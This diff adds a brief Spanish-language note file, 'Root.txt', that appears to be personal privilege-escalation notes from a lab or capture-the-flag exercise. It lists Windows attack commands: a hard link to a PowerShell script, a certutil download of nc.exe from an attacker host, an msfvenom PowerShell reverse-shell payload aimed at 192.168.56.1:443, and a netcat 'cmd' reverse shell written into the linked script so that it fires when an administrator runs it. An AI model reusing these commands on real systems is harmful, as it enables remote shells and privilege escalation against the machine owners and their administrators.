@@ -1,0 +1,12 @@
+Root.txt
+
+
+
+New-Item -ItemType HardLink -Path path\link.ps1 -Target path\x.ps1
+Usar certutil para descargar nc.exe:
+    certutil -urlcache -split -f http://IP:PORT/nc.exe
+    o
+    se puede crear: msfvenom -p windows/x64/powershell_reverse_tcp -ax64 LHOST=192.168.56.1 LPORT=443 -f exe > shell.exe
+
+write-output "path\nc.exe 192.168.56.1 443 -e cmd" | set-content link.ps1
+Y cuando el admin ejecute lso archivos este tambien
